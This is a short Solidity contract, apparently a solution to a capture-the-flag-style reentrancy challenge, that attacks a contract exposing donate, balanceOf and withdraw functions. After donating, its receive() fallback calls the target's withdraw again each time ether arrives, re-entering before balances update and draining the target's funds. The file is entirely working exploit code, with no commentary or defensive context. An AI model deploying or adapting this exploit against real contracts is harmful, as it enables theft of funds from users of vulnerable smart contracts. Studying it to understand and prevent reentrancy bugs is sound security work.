// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;


interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint balance);
    function withdraw(uint _amount) external;
}

contract TheftOfAges {
    event Response(bool success, bytes data);
    IReentrance reentrance;

    constructor(address r) public payable {
        reentrance = IReentrance(r);
        reentrance.donate{value: msg.value}(address(this));
    }

    function withdraw(uint _amount) public {
        reentrance.withdraw(_amount);
    }

    receive() external payable {
        uint256 value = reentrance.balanceOf(address(this));
        uint256 amount = address(reentrance).balance;
        if(value > amount) value = amount;
            reentrance.withdraw(value);
    }
}
